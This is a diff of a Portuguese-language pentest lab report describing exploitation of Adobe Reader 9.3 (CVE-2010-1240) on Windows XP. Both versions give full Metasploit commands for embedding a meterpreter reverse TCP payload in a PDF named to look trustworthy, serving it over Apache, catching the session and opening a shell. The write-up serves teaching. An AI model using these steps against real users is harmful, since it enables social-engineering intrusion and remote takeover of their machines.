@@ -1,55 +1,34 @@
-<h1 style="border-bottom: 2px solid #333; padding-bottom: 10px;">RELATÓRIO TÉCNICO: ANÁLISE DE VULNERABILIDADE (CVE-2010-1240)</h1>
+<h1 style="border-bottom: 2px solid #333; padding-bottom: 10px;">RELATÓRIO TÉCNICO INTEGRADO: ANÁLISE DE VULNERABILIDADES</h1>
 
 <p><strong>DOCUMENTO DE NÍVEL CONFIDENCIAL</strong><br>
 <strong>Data da Operação:</strong> 19 de Novembro de 2025<br>
 <strong>Responsáveis Técnicos:</strong> Yuri Alexander e Gabriel Machado<br>
-<strong>Objeto de Análise:</strong> Exploração de Falha em Client-Side (Adobe Reader 9.3)</p>
+<strong>Ambiente:</strong> Laboratório de Pentest (Virtualizado)</p>
 
-<hr>
+<hr style="border: 0; border-top: 2px solid #000; margin: 30px 0;">
 
-<h3>EVIDÊNCIA EM VÍDEO (YouTube & Local)</h3>
-<p>Registro visual da operação realizada em ambiente de laboratório:</p>
+<h2 style="background-color: #333; color: #fff; padding: 10px;">TRABALHO 1: VERSÃO ARQUIVO.PDF (DOCUMENTAÇÃO TÉCNICA)</h2>
 
-<div align="center" style="margin-bottom: 20px;">
-    <a href="https://youtu.be/lntV_v_hTH0" target="_blank">
-        <img src="https://img.youtube.com/vi/lntV_v_hTH0/hqdefault.jpg" 
-             alt="Assistir Vídeo no YouTube" 
-             style="width:100%; max-width:600px; border: 2px solid #333;">
-    </a>
-    <p>🔴 <strong><a href="https://youtu.be/lntV_v_hTH0">Clique aqui para assistir no YouTube</a></strong></p>
-</div>
-<p><i>Backup local (video.mp4):</i></p>
-<div style="background-color:#000; text-align:center; padding:10px;">
-    <video width="100%" height="auto" controls>
-        <source src="video.mp4" type="video/mp4">
-        Seu navegador não suporta a tag de vídeo.
-    </video>
-</div>
-
-<hr>
-
-<h3>1. RESUMO DO CENÁRIO</h3>
-<p>A operação consistiu em um teste de intrusão focado em Engenharia Social e exploração de vulnerabilidade de software desatualizado. O objetivo foi obter acesso remoto a uma estação de trabalho Windows XP através de um arquivo PDF malicioso.</p>
+<h3>1.1. RESUMO DO CENÁRIO (PDF)</h3>
+<p>A primeira etapa da operação consistiu na criação de um vetor de ataque baseado em documento ("Client-Side Attack"). O objetivo foi embutir um código malicioso dentro de um arquivo PDF legítimo para exploração via Engenharia Social, aproveitando a funcionalidade de anexo de executáveis do Adobe Reader 9.3.</p>
 
 <ul>
-    <li><strong>Máquina Atacante (Kali Linux):</strong> IP 192.168.20.2 (Interface eth0)</li>
-    <li><strong>Máquina Alvo (Windows XP):</strong> Sub-rede 192.168.20.x, executando Adobe Reader 9.3</li>
-    <li><strong>Vetor de Ataque:</strong> Metasploit Framework / Apache Web Server</li>
+    <li><strong>Vetor de Ataque:</strong> Metasploit Framework (Módulo: <code>adobe_pdf_embedded_exe</code>)</li>
+    <li><strong>Infraestrutura de Entrega:</strong> Apache Web Server (Kali Linux)</li>
+    <li><strong>Arquivo Gerado:</strong> <code>ArquivoConfiavel.pdf</code></li>
 </ul>
 
-<hr>
+<h3>1.2. EXECUÇÃO TÉCNICA DETALHADA</h3>
 
-<h3>2. EXECUÇÃO TÉCNICA DETALHADA</h3>
-
-<h4>Fase 1: Configuração do Exploit (Adobe PDF Embedded EXE)</h4>
-<p>Os analistas selecionaram o módulo responsável por embutir um executável malicioso dentro de uma estrutura de arquivo PDF. Esta técnica depende da interação do usuário para ser efetiva.</p>
+<h4>Fase 1: Configuração do Exploit</h4>
+<p>Os analistas iniciaram o console do Metasploit e selecionaram o módulo responsável por gerar o arquivo PDF malicioso.</p>
 
 <pre style="background-color:#f4f4f4; padding:10px; border:1px solid #ddd;">
 <code>msf > use exploit/windows/fileformat/adobe_pdf_embedded_exe</code>
 </pre>
 
-<h4>Fase 2: Definição do Payload e Parâmetros de Rede</h4>
-<p>Nesta etapa, foi configurado o código que estabelece a conexão reversa (o alvo conecta no atacante). O nome do arquivo foi definido como "ArquivoConfiavel.pdf" para aumentar a probabilidade de execução pela vítima.</p>
+<h4>Fase 2: Definição do Payload e Rede</h4>
+<p>Configuração do código de conexão reversa (Reverse TCP) e definição do nome do arquivo para aumentar a credibilidade.</p>
 
 <pre style="background-color:#f4f4f4; padding:10px; border:1px solid #ddd;">
 <code>msf exploit(...) > set PAYLOAD windows/meterpreter/reverse_tcp
@@ -59,28 +38,33 @@ msf exploit(...) > set INFILENAME ArquivoConfiavel.pdf</code>
 </pre>
 
 <blockquote style="background-color:#eee; padding:10px; border-left: 5px solid #555;">
-<strong>NOTA DE TROUBLESHOOTING (ANÁLISE DE FALHA):</strong><br>
-Durante a execução inicial, a conexão reversa falhou. A equipe identificou, através da interface gráfica de rede do Kali Linux ("Wired connection 1"), que o endereço IP local não correspondia ao configurado no exploit.
-<br><br>
-<strong>Ação Corretiva:</strong> O comando <code>set LHOST 192.168.20.2</code> foi reexecutado e o exploit foi gerado novamente para garantir a integridade da conexão.
+<strong>NOTA DE TROUBLESHOOTING (REDE):</strong><br>
+Durante a configuração, a equipe identificou através da interface de rede ("Wired Connection 1") que o IP padrão estava incorreto. Foi necessário ajustar manualmente o parâmetro <code>LHOST</code> para <code>192.168.20.2</code> e regerar o exploit para garantir que a vítima conectasse no endereço certo.
 </blockquote>
 
-<p><strong>Geração do Artefato Final:</strong></p>
+<p><strong>Geração do Artefato:</strong></p>
 <pre style="background-color:#f4f4f4; padding:10px; border:1px solid #ddd;">
 <code>msf exploit(...) > exploit
-# [+] Arquivo gerado com sucesso em: /root/.msf4/local/ArquivoConfiavel.pdf</code>
+# [+] Arquivo gerado: /root/.msf4/local/ArquivoConfiavel.pdf</code>
 </pre>
 
-<h4>Fase 3: Distribuição (Delivery)</h4>
-<p>Para simular um cenário real de download, o arquivo foi movido para o diretório público do servidor web Apache.</p>
+<h4>Fase 3: Configuração do Servidor Web (Apache)</h4>
+<p>Para simular um download realista, o arquivo foi transferido para o servidor web da máquina atacante. Esta etapa é crítica para a entrega (Delivery).</p>
 
+<p><strong>1. Inicialização do Serviço:</strong></p>
 <pre style="background-color:#f4f4f4; padding:10px; border:1px solid #ddd;">
-<code># Cópia do arquivo para o servidor web
-cp /root/.msf4/local/ArquivoConfiavel.pdf /var/www/html/</code>
+<code># service apache2 start
+# service apache2 status</code>
 </pre>
 
-<h4>Fase 4: Configuração do Handler (Escuta)</h4>
-<p>O console do Metasploit foi configurado para aguardar conexões na porta 4444.</p>
+<p><strong>2. Publicação do Arquivo:</strong></p>
+<p>O arquivo foi copiado do diretório oculto do Metasploit para a raiz do servidor web (<code>/var/www/html/</code>).</p>
+<pre style="background-color:#f4f4f4; padding:10px; border:1px solid #ddd;">
+<code># cp /root/.msf4/local/ArquivoConfiavel.pdf /var/www/html/</code>
+</pre>
+
+<h4>Fase 4: Configuração da Escuta (Listener)</h4>
+<p>Preparação do servidor atacante para receber a conexão na porta 4444 quando a vítima abrir o PDF.</p>
 
 <pre style="background-color:#f4f4f4; padding:10px; border:1px solid #ddd;">
 <code>msf > use exploit/multi/handler
@@ -89,45 +73,54 @@ msf exploit(handler) > set LHOST 192.168.20.2
 msf exploit(handler) > exploit</code>
 </pre>
 
-<hr>
+<h4>Fase 5: Pós-Exploração (Comprometimento)</h4>
+<p>A vítima acessou <code>http://192.168.20.2/ArquivoConfiavel.pdf</code> e executou o arquivo. A sessão foi estabelecida:</p>
 
-<h3>3. COMPROMETIMENTO DO ALVO</h3>
-
-<p>A sequência de ações na máquina da vítima resultou na execução do código arbitrário:</p>
-<ol>
-    <li>O usuário acessou o endereço <code>http://192.168.20.2</code> via Internet Explorer.</li>
-    <li>O download do arquivo <strong>ArquivoConfiavel.pdf</strong> foi realizado para o Desktop.</li>
-    <li>Ao abrir o arquivo, o Adobe Reader exibiu o alerta de segurança: <em>"The file and its viewer application are set to be launched by this PDF file"</em>.</li>
-    <li>O usuário ignorou o aviso e clicou no botão <strong>Open</strong>.</li>
-</ol>
-<p><em>Comportamento observado: Uma janela de prompt de comando (CMD) apareceu brevemente e fechou, indicando a injeção do processo na memória.</em></p>
-
-<hr>
-
-<h3>4. PÓS-EXPLORAÇÃO E EVIDÊNCIAS</h3>
-
-<p>Imediatamente após a ação do usuário, a sessão foi estabelecida no console do atacante.</p>
-
-<pre style="background-color:#333; color:#fff; padding:10px;">
-<code>[*] Sending stage (179771 bytes) to 192.168.20.x
-[*] Meterpreter session 1 opened (192.168.20.2:4444 -> 192.168.20.x:1045)</code>
-</pre>
-
-<p>Para confirmar o nível de acesso, foram executados os seguintes comandos:</p>
-
-<p><strong>1. Captura de Tela (Reconhecimento Visual)</strong></p>
-<pre style="background-color:#f4f4f4; padding:5px; border:1px solid #ddd;">
+<pre style="background-color:#f4f4f4; padding:10px; border:1px solid #ddd;">
 <code>meterpreter > screenshot
-# Screenshot saved to /root/screenshot.jpeg</code>
-</pre>
-
-<p><strong>2. Acesso ao Shell do Sistema (Controle Total)</strong></p>
-<pre style="background-color:#f4f4f4; padding:5px; border:1px solid #ddd;">
-<code>meterpreter > shell
+meterpreter > shell
 C:\Documents and Settings\Administrator\Desktop></code>
 </pre>
 
+<br>
+<hr style="border: 0; border-top: 2px solid #000; margin: 30px 0;">
+<br>
+
+<h2 style="background-color: #333; color: #fff; padding: 10px;">TRABALHO 2: VERSÃO ARQUIVO.EXE (EVIDÊNCIA EM VÍDEO)</h2>
+
+<h3>2.1. OBJETIVO DA DEMONSTRAÇÃO</h3>
+<p>Esta seção apresenta a Prova de Conceito (PoC) visual, focada na execução direta do binário malicioso (payload .EXE) e na validação da conexão reversa em tempo real.</p>
+
+<h3>2.2. REGISTRO VISUAL DA OPERAÇÃO</h3>
+
+<div align="center" style="margin-bottom: 20px; background-color: #f9f9f9; padding: 15px; border: 1px solid #ccc;">
+    <p><strong>CLIQUE NA IMAGEM ABAIXO PARA ASSISTIR À DEMONSTRAÇÃO:</strong></p>
+    <a href="https://youtu.be/lntV_v_hTH0" target="_blank">
+        <img src="https://img.youtube.com/vi/lntV_v_hTH0/hqdefault.jpg" 
+             alt="Assistir Vídeo no YouTube" 
+             style="width:100%; max-width:600px; border: 2px solid #333; box-shadow: 0 0 10px rgba(0,0,0,0.3);">
+    </a>
+    <p style="margin-top:10px;">🔴 <strong><a href="https://youtu.be/lntV_v_hTH0">Link direto para o YouTube</a></strong></p>
+</div>
+
+<p><i>Backup do arquivo local (video.mp4):</i></p>
+<div style="background-color:#000; text-align:center; padding:10px;">
+    <video width="100%" height="auto" controls>
+        <source src="video.mp4" type="video/mp4">
+        Seu navegador não suporta a tag de vídeo.
+    </video>
+</div>
+
+<h3>2.3. ANÁLISE DO VÍDEO</h3>
+<p>O vídeo documenta os seguintes eventos críticos:</p>
+<ol>
+    <li><strong>Preparação:</strong> Verificação final do IP (192.168.20.2) e geração do executável.</li>
+    <li><strong>Execução:</strong> A vítima executa o arquivo manualmente na estação Windows XP.</li>
+    <li><strong>Conexão:</strong> O console do Kali Linux confirma a abertura da <code>Meterpreter session 1</code> instantaneamente.</li>
+    <li><strong>Controle:</strong> Demonstração de controle total sobre o sistema operacional alvo.</li>
+</ol>
+
 <hr>
 
-<h3>5. CONCLUSÃO</h3>
-<p>O teste foi concluído com êxito, demonstrando vulnerabilidade crítica no ambiente analisado. A combinação de software desatualizado com a falta de conscientização do usuário permitiu o comprometimento total da confidencialidade e integridade do sistema alvo.</p>
+<h3>3. CONCLUSÃO GERAL</h3>
+<p>Os procedimentos realizados validam a vulnerabilidade crítica no ambiente. A combinação da entrega via servidor web (Apache) com a engenharia social (PDF/EXE) provou ser eficaz para contornar as defesas do usuário e do sistema operacional legado.</p>
